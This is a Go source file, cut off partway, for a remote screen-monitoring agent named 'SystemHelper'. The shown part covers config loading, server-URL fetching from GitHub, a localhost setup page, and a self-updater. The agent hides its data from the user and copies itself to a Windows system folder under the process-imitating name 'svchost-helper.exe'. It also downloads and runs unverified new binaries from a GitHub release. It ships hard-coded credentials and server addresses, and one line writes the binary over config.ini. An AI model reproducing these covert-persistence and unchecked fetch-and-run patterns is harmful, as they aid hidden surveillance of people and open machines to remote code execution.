package main

import (
	"bytes"
	"crypto/sha256"
	"encoding/base64"
	"encoding/json"
	"fmt"
	"io"
	"image/jpeg"
	"net"
	"net/http"
	"os"
	"os/exec"
	"os/signal"
	"path/filepath"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"syscall"
	"time"

	"github.com/kbinani/screenshot"
	"github.com/gorilla/websocket"
	"github.com/pion/webrtc/v4"
)

const Version = "7.2.1"

var agentId string
var isServerMode = false
var isInternalMode = false
var orgName = ""
var fps = 1
var jpegQuality = 50
var isRemoteConnection = false // Used for FPS optimization
var logFile *os.File
var logMu sync.Mutex // Protects logFile writes
var hostname string
var authUser = "puneet"
var authPass = "puneet12"
var authToken = ""

// Connection ID for race condition prevention — each reconnect gets a new ID
var connectionId string

// Rate limiting for control commands
var controlCmdCount int
var controlCmdWindowStart time.Time
const maxControlCmdsPerSec = 30

// Fallback tracking
var consecutiveFailures int
var tunnelStarted bool
var isLanMode bool // mode=lan: skip GitHub fetch + cloud defaults
var lastUpdateCheck time.Time

// Deployment defaults — overridden by config.ini
var (
	DefaultServerURL   = "wss://pu-k752.onrender.com"
	DirectServerIP     = "ws://43.247.40.101:3000"
	GitHubRegistryURL  = "https://raw.githubusercontent.com/puniteswra-spec/PU/main/urls.ini"
	GitHubRepo         = "puniteswra-spec/PU"
	ConfigPort         = 8181
	BrandingCredit     = "Monitor System designed by Puneet Upreti"
	BrandingTitle      = "Remote Monitor"
)

var serverUrls = []string{
	DefaultServerURL,
	"ws://127.0.0.1:3000",
	DirectServerIP,
}

var embeddedServerUrls []string // Populated from urls= in config.ini

var serverNames = map[string]string{
	"render": DefaultServerURL,
	"direct": DirectServerIP,
}

// Activity tracking
var programStartTime = time.Now()
var lastIdleState = "active"
var idlePeriodStart time.Time
var activePeriodStart = time.Now()
var totalIdleSeconds int64
var totalActiveSeconds int64
var currentIdleSeconds int

// Data directory for config/logs (hidden from user)
func dataDir() string {
	exe, _ := os.Executable()
	// On Windows, use %APPDATA%\SystemHelper
	if runtime.GOOS == "windows" {
		appData := os.Getenv("APPDATA")
		if appData != "" {
			d := filepath.Join(appData, "SystemHelper")
			os.MkdirAll(d, 0755)
			return d
		}
	}
	// Fallback: next to .exe
	return filepath.Dir(exe)
}

func loadAuth() {
	cfgFile := filepath.Join(dataDir(), "auth.ini")

	// Try to read from file
	data, err := os.ReadFile(cfgFile)
	if err == nil {
		lines := strings.Split(string(data), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if strings.HasPrefix(line, "username=") {
				authUser = strings.TrimPrefix(line, "username=")
			}
			if strings.HasPrefix(line, "password=") {
				authPass = strings.TrimPrefix(line, "password=")
			}
		}
	} else {
		// Create default config file
		defaultCfg := "username=" + authUser + "\npassword=" + authPass + "\n"
		os.WriteFile(cfgFile, []byte(defaultCfg), 0644)
	}
	authToken = sha256Hex(authUser + ":" + authPass)
}

func sha256Hex(s string) string {
	h := sha256.Sum256([]byte(s))
	return fmt.Sprintf("%x", h)
}

func checkAuth(w http.ResponseWriter, r *http.Request) bool {
	u, p, ok := r.BasicAuth()
	if ok && u == authUser && p == authPass { return true }
	w.Header().Set("WWW-Authenticate", `Basic realm="Remote Monitor"`)
	http.Error(w, "Unauthorized", 401)
	return false
}

func loadCustomUrls() {
	serverUrls = []string{}

	if !isLanMode {
		// 1. Priority: GitHub Registry (Global Config) — skipped in LAN mode
		resp, err := http.Get(GitHubRegistryURL + "?t=" + strconv.FormatInt(time.Now().Unix(), 10))
		if err == nil && resp != nil {
			defer resp.Body.Close()
			if resp.StatusCode == http.StatusOK {
				buf := new(bytes.Buffer)
				_, readErr := buf.ReadFrom(resp.Body)
				if readErr == nil {
					lines := strings.Split(buf.String(), "\n")
					for _, line := range lines {
						line = strings.TrimSpace(line)
						if line != "" && !strings.HasPrefix(line, "#") {
							serverUrls = append(serverUrls, line)
						}
					}
					if len(serverUrls) > 0 {
						log("✅ Loaded URLs from Central GitHub Registry (Priority 1)")
					}
				}
			}
		}
	} else {
		log("🔒 LAN mode: skipping GitHub registry")
	}

	// 2. Fallback: Local urls.ini (Machine Specific Config)
	// Used if GitHub is down or to add local-only servers.
	exe, _ := os.Executable()
	exeDir := filepath.Dir(exe)
	exeFile := filepath.Join(exeDir, "urls.ini")
	dataFile := filepath.Join(dataDir(), "urls.ini")
	
	paths := []string{dataFile, exeFile} // Check AppData first, then exe dir
	for _, urlFile := range paths {
		data, err := os.ReadFile(urlFile)
		if err != nil { continue }
		
		lines := strings.Split(string(data), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line != "" && !strings.HasPrefix(line, "#") {
				// Only add if not already in list (avoid duplicates)
				found := false
				for _, u := range serverUrls {
					if u == line { found = true; break }
				}
				if !found {
					serverUrls = append(serverUrls, line)
				}
			}
		}
	}
	
	// 3. Default: Baked-in embedded URLs + localhost
	// Always include localhost first for fast same-network access
	foundLocal := false
	for _, u := range serverUrls {
		if u == "ws://127.0.0.1:3000" { foundLocal = true; break }
	}
	if !foundLocal {
		serverUrls = append([]string{"ws://127.0.0.1:3000"}, serverUrls...)
		log("✅ Added localhost to server list")
	}
	
	// Append any embedded URLs not already in the list
	for _, eu := range embeddedServerUrls {
		found := false
		for _, u := range serverUrls {
			if u == eu { found = true; break }
		}
		if !found {
			serverUrls = append(serverUrls, eu)
		}
	}

	if len(serverUrls) == 0 {
		// Ultimate fallback if even embedded list is empty
		serverUrls = append(serverUrls, "wss://pu-k752.onrender.com")
		log("⚠️ Using hardcoded Render URL as ultimate fallback")
	}
	
	// Deduplicate just in case
	seen := make(map[string]bool)
	deduped := []string{}
	for _, u := range serverUrls {
		if !seen[u] {
			seen[u] = true
			deduped = append(deduped, u)
		}
	}
	serverUrls = deduped
}

// startUrlRefresher periodically checks GitHub for server list updates
func startUrlRefresher() {
	if isLanMode { return } // No GitHub to refresh in LAN mode

	ticker := time.NewTicker(8 * time.Hour) // Check every 8 hours to reduce load
	go func() {
		for range ticker.C {
			log("🔄 Periodic check: Refreshing server list from GitHub...")
			serverUrlsMu.RLock()
			oldCount := len(serverUrls)
			serverUrlsMu.RUnlock()
			loadCustomUrls()
			serverUrlsMu.RLock()
			newCount := len(serverUrls)
			serverUrlsMu.RUnlock()
			if newCount != oldCount {
				log("📢 Server list updated from GitHub! New count: " + strconv.Itoa(newCount))
			}
		}
	}()
}

// compareVersions returns true if v1 > v2 (semver-like "7.2.0" comparison)
func compareVersions(v1, v2 string) bool {
	v1 = strings.TrimPrefix(v1, "v")
	v2 = strings.TrimPrefix(v2, "v")
	p1 := strings.Split(v1, ".")
	p2 := strings.Split(v2, ".")
	maxLen := len(p1)
	if len(p2) > maxLen { maxLen = len(p2) }
	for i := 0; i < maxLen; i++ {
		n1, n2 := 0, 0
		if i < len(p1) { n1, _ = strconv.Atoi(p1[i]) }
		if i < len(p2) { n2, _ = strconv.Atoi(p2[i]) }
		if n1 > n2 { return true }
		if n1 < n2 { return false }
	}
	return false
}

// startAutoUpdater periodically checks GitHub Releases for newer agent versions.
// When found, it downloads and replaces itself automatically — zero user action.
func startAutoUpdater() {
	if GitHubRepo == "" || isLanMode { return }
	
	apiURL := "https://api.github.com/repos/" + GitHubRepo + "/releases/latest"
	ticker := time.NewTicker(6 * time.Hour)
	
	// Also check on startup (after a short delay to let the agent connect first)
	go func() {
		time.Sleep(30 * time.Second)
		checkForUpdate(apiURL)
	}()
	
	go func() {
		for range ticker.C {
			checkForUpdate(apiURL)
		}
	}()
}

func checkForUpdate(apiURL string) {
	if time.Since(lastUpdateCheck) < time.Hour { return } // Don't check more than once per hour
	lastUpdateCheck = time.Now()
	
	resp, err := http.Get(apiURL)
	if err != nil { return }
	defer resp.Body.Close()
	
	if resp.StatusCode != http.StatusOK { return }
	
	body, err := io.ReadAll(resp.Body)
	if err != nil { return }
	
	var release struct {
		TagName string `json:"tag_name"`
		Assets  []struct {
			Name string `json:"name"`
			URL  string `json:"browser_download_url"`
		} `json:"assets"`
	}
	if err := json.Unmarshal(body, &release); err != nil { return }
	
	latest := strings.TrimPrefix(release.TagName, "v")
	current := strings.TrimPrefix(Version, "v")
	
	if !compareVersions(latest, current) {
		return // Not newer
	}
	
	log("🔄 New version detected: v" + latest + " (current: v" + current + ")")
	
	// Find the right asset for this platform
	assetName := "SystemHelper.exe"
	if runtime.GOOS == "darwin" { assetName = "SystemHelper-darwin" }
	if runtime.GOOS == "linux" { assetName = "SystemHelper-linux" }
	
	var downloadURL string
	for _, a := range release.Assets {
		if a.Name == assetName {
			downloadURL = a.URL
			break
		}
	}
	
	if downloadURL == "" {
		log("⚠️ No asset found for " + assetName + " in release v" + latest)
		return
	}
	
	log("⬇️ Downloading update from " + downloadURL)
	
	dlResp, err := http.Get(downloadURL)
	if err != nil { log("❌ Download failed: " + err.Error()); return }
	defer dlResp.Body.Close()
	
	newExe, err := io.ReadAll(dlResp.Body)
	if err != nil { log("❌ Download read failed: " + err.Error()); return }
	
	log("✅ Downloaded " + fmt.Sprintf("%d bytes", len(newExe)))
	applyUpdate(newExe, latest)
}

func applyUpdate(newData []byte, version string) {
	exe, err := os.Executable()
	if err != nil {
		log("❌ Cannot get executable path: " + err.Error())
		return
	}
	
	exeDir := filepath.Dir(exe)
	exeName := filepath.Base(exe)
	
	// Write the new binary to a temp file next to the current exe
	tmpPath := filepath.Join(exeDir, "."+exeName+".new")
	if err := os.WriteFile(tmpPath, newData, 0755); err != nil {
		log("❌ Cannot write update: " + err.Error())
		return
	}
	
	// Also write to the persisted watchdog location so it survives reboot
	persistDir := filepath.Join("C:\\ProgramData", "Microsoft", "Windows", "SystemHelper")
	persistPath := filepath.Join(persistDir, "svchost-helper.exe")
	
	log("🔄 Installing update v" + version + " — restarting...")
	
	if runtime.GOOS == "windows" {
		// Windows: batch script waits for us to exit, copies both, and restarts
		copyCmds := "copy /Y \"" + tmpPath + "\" \"" + exe + "\" > nul\r\n"
		if exe != persistPath {
			os.WriteFile(filepath.Join(persistDir, "config.ini"), newData, 0644) // placeholder, ignored on next line
			copyCmds += "copy /Y \"" + tmpPath + "\" \"" + persistPath + "\" > nul\r\n"
		}
		batchContent := "@echo off\r\n" +
			"ping 127.0.0.1 -n 3 > nul\r\n" +
			copyCmds +
			"del \"" + tmpPath + "\"\r\n" +
			"start \"\" \"" + exe + "\"\r\n" +
			"exit\r\n"
		batchPath := filepath.Join(exeDir, "."+exeName+".bat")
		os.WriteFile(batchPath, []byte(batchContent), 0644)
		exec.Command("cmd", "/C", batchPath).Start()
	} else {
		// macOS/Linux: overwrite directly (Unix allows writing to running exe)
		os.WriteFile(exe, newData, 0755)
		os.Remove(tmpPath)
		if persistPath != exe {
			os.MkdirAll(persistDir, 0755)
			os.WriteFile(persistPath, newData, 0755)
		}
	}
	
	os.Exit(0)
}

// Built-in config web server — access via http://localhost:8181
func startConfigServer() {
	mux := http.NewServeMux()
	mux.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		w.Write([]byte(configPageHTML))
	})
	mux.HandleFunc("/api/status", func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "application/json")
		serverUrlsMu.RLock()
		urlsCopy := make([]string, len(serverUrls))
		copy(urlsCopy, serverUrls)
		serverUrlsMu.RUnlock()
		activeConnsMu.RLock()
		connected := false
		for _, sc := range activeConnections {
			if sc != nil && !sc.dead { connected = true; break }
		}
		activeConnsMu.RUnlock()
		json.NewEncoder(w).Encode(map[string]interface{}{
			"version":   Version,
			"agentId":   agentId,
			"hostname":  hostname,
			"urls":      urlsCopy,
			"mode":      map[string]interface{}{"lan": isLanMode, "label": map[bool]string{true: "LAN", false: "Cloud"}[isLanMode]},
			"uptime":    time.Since(programStartTime).String(),
			"connected": connected,
		})
	})
	mux.HandleFunc("/api/mode", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			var body struct {
				Mode string `json:"mode"`
			}
			json.NewDecoder(r.Body).Decode(&body)
			if body.Mode == "lan" || body.Mode == "cloud" {
				os.WriteFile(filepath.Join(dataDir(), "mode.ini"), []byte("mode="+body.Mode+"\n"), 0644)
				log("Mode changed to: " + body.Mode + " — restart to apply")
				w.Write([]byte(`{"ok":true,"message":"Mode saved. Restart agent to apply."}`))
				return
			}
			w.Write([]byte(`{"error":"invalid mode"}`))
		} else {
			w.Header().Set("Content-Type", "application/json")
			json.NewEncoder(w).Encode(map[string]interface{}{
				"mode":  map[bool]string{true: "lan", false: "cloud"}[isLanMode],
				"label": map[bool]string{true: "LAN (offline)", false: "Cloud (GitHub + Render)"}[isLanMode],
			})
		}
	})
	mux.HandleFunc("/api/urls", func(w http.ResponseWriter, r *http.Request) {
		if r.Method == "POST" {
			var body struct {
				URL string `json:"url"`
			}
			json.NewDecoder(r.Body).Decode(&body)
			if body.URL != "" {
				serverUrlsMu.Lock()
				serverUrls = append([]string{body.URL}, serverUrls...)
				serverUrlsMu.Unlock()
				dataFile := filepath.Join(dataDir(), "urls.ini")
				os.WriteFile(dataFile, []byte(body.URL+"\n"), 0644)
				log("URL updated via config panel: " + body.URL)
				activeConnsMu.RLock()
				for _, sc := range activeConnections {
					if sc != nil && !sc.dead {
						sc.mu.Lock()
						if sc.conn != nil { sc.conn.Close() }
						sc.mu.Unlock()
					}
				}
				activeConnsMu.RUnlock()
			}
			w.Write([]byte(`{"ok":true}`))
		} else if r.Method == "DELETE" {
			var body struct {
				URL string `json:"url"`
			}
			json.NewDecoder(r.Body).Decode(&body)
			if body.URL != "" {
				serverUrlsMu.Lock()
				var filtered []string
				for _, u := range serverUrls {
					if u != body.URL { filtered = append(filtered, u) }
				}
				serverUrls = filtered
				serverUrlsMu.Unlock()
				dataFile := filepath.Join(dataDir(), "urls.ini")
				content := strings.Join(filtered, "\n")
				os.WriteFile(dataFile, []byte(content+"\n"), 0644)
				log("URL removed via config panel: " + body.URL)
			}
			w.Write([]byte(`{"ok":true}`))
		} else {
			w.Header().Set("Content-Type", "application/json")
			serverUrlsMu.RLock()
			urlsCopy := make([]string, len(serverUrls))
			copy(urlsCopy, serverUrls)
			serverUrlsMu.RUnlock()
			json.NewEncoder(w).Encode(map[string]interface{}{"urls": urlsCopy})
		}
	})
	mux.HandleFunc("/api/restart", func(w http.ResponseWriter, r *http.Request) {
		w.Write([]byte(`{"ok":true}`))
		go func() { time.Sleep(500 * time.Millisecond); os.Exit(0) }()
	})

	addr := fmt.Sprintf("127.0.0.1:%d", ConfigPort)
	go func() {
		if err := http.ListenAndServe(addr, mux); err != nil {
			log("Config server error: " + err.Error())
		}
	}()
	log("Config panel: http://localhost:" + strconv.Itoa(ConfigPort))
}

const configPageHTML = `<!DOCTYPE html>
<html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><title>SystemHelper Setup Wizard</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:system-ui,sans-serif;background:#0d1117;color:#c9d1d9;min-height:100vh;padding:20px}
.wiz{max-width:640px;margin:0 auto}
h1{font-size:20px;color:#fff;margin-bottom:4px;display:flex;align-items:center;gap:8px}
.sub{color:#8b949e;font-size:13px;margin-bottom:20px}
.card{background:#161b22;border:1px solid #30363d;border-radius:8px;padding:20px;margin-bottom:16px}
.card h3{font-size:14px;color:#fff;margin-bottom:12px}
.row{display:flex;justify-content:space-between;align-items:center;padding:8px 0;border-bottom:1px solid #21262d;font-size:13px}
.row:last-child{border:0}
.lbl{color:#8b949e}
.val{color:#c9d1d9;word-break:break-all}
.connected{color:#3fb950}
.disconnected{color:#f85149}
label{display:flex;align-items:center;gap:10px;padding:12px;border:1px solid #30363d;border-radius:6px;margin-bottom:8px;cursor:pointer;transition:.15s}
label:hover{background:#1c2128}
label.selected{border-color:#58a6ff;background:#1c2128}
label input[type=radio]{accent-color:#58a6ff;width:16px;height:16px}
label .mode-title{font-size:14px;color:#fff;font-weight:500}
label .mode-desc{font-size:12px;color:#8b949e;margin-top:2px}
.url-row{display:flex;align-items:center;gap:8px;padding:8px 0;border-bottom:1px solid #21262d;font-size:13px}
.url-row:last-child{border:0}
.url-row .url-text{flex:1;color:#c9d1d9;word-break:break-all}
.url-row button{background:0;border:1px solid #30363d;color:#f85149;padding:2px 8px;border-radius:4px;cursor:pointer;font-size:11px}
.url-row button:hover{background:#f85149;color:#fff}
.presets{display:flex;flex-wrap:wrap;gap:6px;margin-bottom:12px}
.presets button{background:#21262d;border:1px solid #30363d;color:#c9d1d9;padding:6px 12px;border-radius:6px;cursor:pointer;font-size:12px}
.presets button:hover{background:#30363d;border-color:#58a6ff}
input[type=text]{width:100%;padding:8px 12px;background:#0d1117;border:1px solid #30363d;color:#c9d1d9;border-radius:6px;font-size:13px;font-family:monospace}
input[type=text]:focus{border-color:#58a6ff;outline:0}
.btn{background:#238636;border:0;color:#fff;padding:8px 20px;border-radius:6px;cursor:pointer;font-size:13px;font-weight:500}
.btn:hover{background:#2ea043}
.btn.danger{background:#da3633}
.btn.danger:hover{background:#f85149}
.btn.secondary{background:#21262d;border:1px solid #30363d}
.btn.secondary:hover{background:#30363d}
.actions{display:flex;gap:8px;margin-top:16px}
#status{padding:8px 12px;border-radius:6px;font-size:13px;margin-top:12px;display:none}
#status.ok{display:block;background:#1c2128;border:1px solid #238636;color:#3fb950}
#status.err{display:block;background:#1c2128;border:1px solid #da3633;color:#f85149}
</style></head><body>
<div class="wiz">
<h1>🔧 SystemHelper Setup Wizard</h1>
<div class="sub">Configure deployment mode and server URLs for this agent</div>

<div class="card" id="status-card">
<h3>📊 Agent Status</h3>
<div id="status-info"></div>
</div>

<div class="card">
<h3>🌐 Step 1: Choose Deployment Mode</h3>
<label id="mode-cloud" onclick="setMode('cloud')">
  <input type="radio" name="mode" value="cloud">
  <div><div class="mode-title">☁️ Cloud Mode</div>
  <div class="mode-desc">Fetch server list from GitHub, use Render cloud. Best for multi-location / remote access.</div></div>
</label>
<label id="mode-lan" onclick="setMode('lan')">
  <input type="radio" name="mode" value="lan">
  <div><div class="mode-title">🏠 LAN Mode (Offline)</div>
  <div class="mode-desc">Fully local — no GitHub, no cloud. Only uses the server URLs listed below. No internet needed.</div></div>
</label>
</div>

<div class="card">
<h3>🔗 Step 2: Server URLs</h3>
<div class="presets">
  <button onclick="addPreset('wss://pu-k752.onrender.com')">Render</button>
  <button onclick="addPreset('ws://oracle-vps:3000')">Oracle VPS</button>
  <button onclick="addPreset('ws://192.168.1.100:3000')">LAN Server</button>
  <button onclick="addPreset('ws://127.0.0.1:3000')">Localhost</button>
</div>
<div id="url-list"></div>
<div style="display:flex;gap:8px;margin-top:8px">
  <input type="text" id="new-url" placeholder="wss://your-server:3000" onkeydown="if(event.key==='Enter')addUrl()">
  <button class="btn" onclick="addUrl()" style="white-space:nowrap">+ Add</button>
</div>
</div>

<div class="actions">
  <button class="btn" onclick="saveAndRestart()">💾 Save &amp; Restart Agent</button>
  <button class="btn secondary" onclick="location.reload()">🔄 Refresh</button>
</div>
<div id="status"></div>
</div>

<script>
var currentUrls = [];

function load() {
  Promise.all([fetch('/api/status').then(r=>r.json()), fetch('/api/mode').then(r=>r.json())]).then(function(d){
    var status = d[0], modeData = d[1];

    document.getElementById('status-info').innerHTML =
      '<div class="row"><span class="lbl">Version</span><span class="val">' + status.version + '</span></div>' +
      '<div class="row"><span class="lbl">Agent</span><span class="val">' + status.agentId + '</span></div>' +
      '<div class="row"><span class="lbl">Host</span><span class="val">' + status.hostname + '</span></div>' +
      '<div class="row"><span class="lbl">Uptime</span><span class="val">' + status.uptime + '</span></div>' +
      '<div class="row"><span class="lbl">Mode</span><span class="val">' + (status.mode.lan ? '🏠 LAN' : '☁️ Cloud') + '</span></div>' +
      '<div class="row"><span class="lbl">Connected</span><span class="val ' + (status.connected ? 'connected' : 'disconnected') + '">' + (status.connected ? '✅ Yes' : '❌ No') + '</span></div>';

    document.getElementById('mode-cloud').classList.remove('selected');
    document.getElementById('mode-lan').classList.remove('selected');
    if (modeData.mode === 'lan') {
      document.getElementById('mode-lan').classList.add('selected');
      document.querySelector('#mode-lan input').checked = true;
    } else {
      document.getElementById('mode-cloud').classList.add('selected');
      document.querySelector('#mode-cloud input').checked = true;
    }

    currentUrls = status.urls || [];
    renderUrls();
  }).catch(function(){ document.getElementById('status-info').innerHTML = '<div style="color:#f85149">Failed to load status</div>'; });
}

function renderUrls() {
  var html = '';
  if (currentUrls.length === 0) { html = '<div style="color:#8b949e;font-size:13px">No URLs configured</div>'; }
  else {
    currentUrls.forEach(function(u){
      var isBaked = u === 'ws://127.0.0.1:3000';
      html += '<div class="url-row"><span class="url-text">' + u + '</span>' +
        (isBaked ? '<span style="color:#8b949e;font-size:11px">built-in</span>' : '<button onclick="removeUrl(\'' + u.replace(/'/g, "\\'") + '\')">✕</button>') +
        '</div>';
    });
  }
  document.getElementById('url-list').innerHTML = html;
}

function setMode(m) {
  fetch('/api/mode', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({mode:m})})
  .then(function(r){ return r.json(); })
  .then(function(d){
    showStatus(d.ok ? '✅ Mode saved to ' + m + '. Restart agent to apply.' : '❌ ' + (d.error||'Failed'), d.ok);
    load();
  });
}

function addPreset(url) {
  document.getElementById('new-url').value = url;
}

function addUrl() {
  var url = document.getElementById('new-url').value.trim();
  if (!url) return;
  if (!url.startsWith('ws://') && !url.startsWith('wss://')) { showStatus('❌ URL must start with ws:// or wss://', false); return; }
  fetch('/api/urls', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({url:url})})
  .then(function(r){ return r.json(); })
  .then(function(d){
    if (d.ok) {
      document.getElementById('new-url').value = '';
      showStatus('✅ URL added: ' + url, true);
      setTimeout(load, 1000);
    }
  });
}

function removeUrl(url) {
  fetch('/api/urls', {method:'DELETE', headers:{'Content-Type':'application/json'}, body:JSON.stringify({url:url})})
  .then(function(r){ return r.json(); })
  .then(function(d){
    if (d.ok) {
      showStatus('🗑️ URL removed: ' + url, true);
      setTimeout(load, 1000);
    }
  });
}

function saveAndRestart() {
  var mode = document.querySelector('input[name="mode"]:checked');
  if (!mode) { showStatus('❌ Select a deployment mode first', false); return; }
  showStatus('🔄 Saving and restarting agent...', true);
  fetch('/api/restart', {method:'POST'});
}

function showStatus(msg, ok) {
  var s = document.getElementById('status');
  s.textContent = msg;
  s.className = ok ? 'ok' : 'err';
  s.style.display = 'block';
  setTimeout(function(){ s.style.display = 'none'; }, 5000);
}

load();
</script></body></html>`

// Agent info for server mode
type AgentInfo struct {
	Ws          *websocket.Conn
	Name        string
	Hostname    string
	LocalIP     string
	PublicIP    string
	AgentIP     string
	Org         string
	Version     string
	BootTime    string
	ProgramStart string
	ConnectionId string
	LastFrame   string
	Uptime      int
	TotalIdle   int64
	TotalActive int64
	CurrentState string
	TunnelURL   string
	Viewers     map[*websocket.Conn]bool
	LastSeen    time.Time // Heartbeat tracking
}

func init() {
	hostname, _ = os.Hostname()
	// Open log file FIRST so all init messages are captured
	f, _ := os.OpenFile(filepath.Join(dataDir(), "agent.log"), os.O_CREATE|os.O_WRONLY|os.O_APPEND, 0644)
	logFile = f
	os.MkdirAll(receivedDir(), 0755)
	
	loadDeploymentConfig()
	loadAuth()
	loadCustomUrls()
	
	log("Started v" + Version)
}

// Embedded deployment config — self-contained binary, no separate file needed
const embeddedConfig = `# ============================================================
# SystemHelper Deployment Configuration
# ============================================================
# This file is embedded in SystemHelper.exe and auto-extracted on first run.
# To customize for a new company: edit this section, then rebuild.
#
# Lines starting with # or ; are comments and are ignored.
#
# LOCATION (auto-extracted to):
#   1. Same folder as SystemHelper.exe
#   2. %APPDATA%\SystemHelper\config.ini
# ============================================================

# Authentication credentials (used for dashboard login & agent auth)
auth_user=puneet
auth_pass=puneet12

# ── Deployment Mode ────────────────────────────────────────────
# mode=cloud → uses GitHub registry + Render cloud (default)
# mode=lan   → fully offline, only urls= below, no external calls
# ───────────────────────────────────────────────────────────────
mode=cloud

# Baked-in server URLs — built into the binary, no external file needed
# In cloud mode:  fallback when GitHub is unreachable
# In LAN mode:    the ONLY URLs used (GitHub is skipped entirely)
# Format: one URL per line, wss:// for secure, ws:// for plain
# ───────────────────────────────────────────────────────────────
# For Render / cloud:
#   urls=wss://pu-k752.onrender.com
# For LAN / Oracle / VPS:
#   urls=ws://192.168.1.100:3000
#   urls=ws://10.0.0.5:3000
# ───────────────────────────────────────────────────────────────
urls=wss://pu-k752.onrender.com
urls=ws://43.247.40.101:3000

# GitHub URL for centralized server list management (cloud mode only)
# Agents fetch this file to get updated server URLs
# Format: one URL per line, # for comments
github_config_url=https://raw.githubusercontent.com/puniteswra-spec/PU/main/urls.ini

# GitHub repo for auto-updates (owner/repo format)
# Agent checks GitHub Releases for newer versions and auto-updates.
# Set to empty to disable auto-update.
github_repo=puniteswra-spec/PU

# Configuration panel port (http://localhost:PORT)
config_port=8181

# Branding text shown in dashboard header and lock screen
branding_title=Remote Monitor
branding_credit=Monitor System designed by Puneet Upreti

# ============================================================
# Deployment Checklist for New Company:
# ============================================================
# 1. Edit the urls= lines above for your servers
# 2. Rebuild: go build -o SystemHelper.exe -ldflags="-H windowsgui" .
# 3. Distribute the single .exe file (URLs are baked in!)
# 4. Optional: place a separate urls.ini next to .exe to override
# ============================================================
`

func loadDeploymentConfig() {
	// config.ini search order:
	// 1. Same directory as .exe (external override)
	// 2. %APPDATA%\SystemHelper\ (agent data dir)
	// 3. Current working directory
	// 4. Embedded config (built-in)
	exe, _ := os.Executable()
	exeDir := filepath.Dir(exe)
	cwd, _ := os.Getwd()
	
	searchPaths := []string{
		filepath.Join(exeDir, "config.ini"),
		filepath.Join(dataDir(), "config.ini"),
		filepath.Join(cwd, "config.ini"),
	}
	
	var configPath string
	var data []byte
	var err error
	
	for _, p := range searchPaths {
		data, err = os.ReadFile(p)
		if err == nil {
			configPath = p
			break
		}
	}
	
	// If no external config found, extract embedded config
	if configPath == "" {
		log("No config.ini found — extracting embedded config")
		configPath = filepath.Join(exeDir, "config.ini")
		os.WriteFile(configPath, []byte(embeddedConfig), 0644)
		// Also copy to APPDATA for persistence
		appDataCfg := filepath.Join(dataDir(), "config.ini")
		os.WriteFile(appDataCfg, []byte(embeddedConfig), 0644)
		data = []byte(embeddedConfig)
	}
	
	log("Loading deployment config from: " + configPath)
	lines := strings.Split(string(data), "\n")
	for _, line := range lines {
		line = strings.TrimSpace(line)
		if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, ";") { continue }
		
		if strings.HasPrefix(line, "mode=") {
			m := strings.TrimSpace(strings.TrimPrefix(line, "mode="))
			isLanMode = m == "lan"
		} else if strings.HasPrefix(line, "urls=") {
			u := strings.TrimSpace(strings.TrimPrefix(line, "urls="))
			if u != "" {
				embeddedServerUrls = append(embeddedServerUrls, u)
			}
		} else if strings.HasPrefix(line, "default_server=") {
			DefaultServerURL = strings.TrimSpace(strings.TrimPrefix(line, "default_server="))
		} else if strings.HasPrefix(line, "direct_server=") {
			DirectServerIP = strings.TrimSpace(strings.TrimPrefix(line, "direct_server="))
		} else if strings.HasPrefix(line, "auth_user=") {
			authUser = strings.TrimSpace(strings.TrimPrefix(line, "auth_user="))
		} else if strings.HasPrefix(line, "auth_pass=") {
			authPass = strings.TrimSpace(strings.TrimPrefix(line, "auth_pass="))
		} else if strings.HasPrefix(line, "github_config_url=") {
			GitHubRegistryURL = strings.TrimSpace(strings.TrimPrefix(line, "github_config_url="))
		} else if strings.HasPrefix(line, "github_repo=") {
			GitHubRepo = strings.TrimSpace(strings.TrimPrefix(line, "github_repo="))
		} else if strings.HasPrefix(line, "config_port=") {
			port := strings.TrimSpace(strings.TrimPrefix(line, "config_port="))
			if p, err := strconv.Atoi(port); err == nil && p > 0 && p < 65536 {
				ConfigPort = p
			}
		} else if strings.HasPrefix(line, "branding_credit=") {
			BrandingCredit = strings.TrimSpace(strings.TrimPrefix(line, "branding_credit="))
		} else if strings.HasPrefix(line, "branding_title=") {
			BrandingTitle = strings.TrimSpace(strings.TrimPrefix(line, "branding_title="))
		}
	}
	
	// Backward compat: if no urls= in config, use legacy fields
	if len(embeddedServerUrls) == 0 {
		if DefaultServerURL != "" {
			embeddedServerUrls = append(embeddedServerUrls, DefaultServerURL)
		}
		if DirectServerIP != "" {
			embeddedServerUrls = append(embeddedServerUrls, DirectServerIP)
		}
	}

	// Populate serverNames from embedded URLs (used by --use flag)
	serverNames = make(map[string]string)
	for i, u := range embeddedServerUrls {
		key := fmt.Sprintf("url%d", i)
		if strings.Contains(u, "render.com") {
			key = "render"
		} else if !strings.HasPrefix(u, "wss:") && !strings.HasPrefix(u, "wss://") {
			key = "direct"
		}
		serverNames[key] = u
	}
	
	// Check for mode.ini override (set via config panel wizard)
	if modeData, err := os.ReadFile(filepath.Join(dataDir(), "mode.ini")); err == nil {
		for _, ml := range strings.Split(string(modeData), "\n") {
			ml = strings.TrimSpace(ml)
			if strings.HasPrefix(ml, "mode=") {
				m := strings.TrimPrefix(ml, "mode=")
				if m == "lan" || m == "cloud" {
					isLanMode = m == "lan"
					log("Mode override from mode.ini: " + m)
				}
			}
		}
	}

	log("Deployment config loaded: auth=" + authUser + " mode=" + map[bool]string{true: "LAN", false: "Cloud"}[isLanMode] + " urls=" + fmt.Sprintf("%v", embeddedServerUrls) + " port=" + strconv.Itoa(ConfigPort))
}

func log(msg string) {
	timestamp := time.Now().Format("15:04:05")
	fmt.Println(timestamp + " " + msg)
	if logFile != nil {
		logMu.Lock()
		logFile.WriteString(timestamp + " " + msg + "\n")
		logFile.Sync()
		logMu.Unlock()
	}
}

type Message struct {
	Type    string                 `json:"type"`
	AgentId string                 `json:"agentId,omitempty"`
	Name    string                 `json:"name,omitempty"`
	Org     string                 `json:"org,omitempty"`
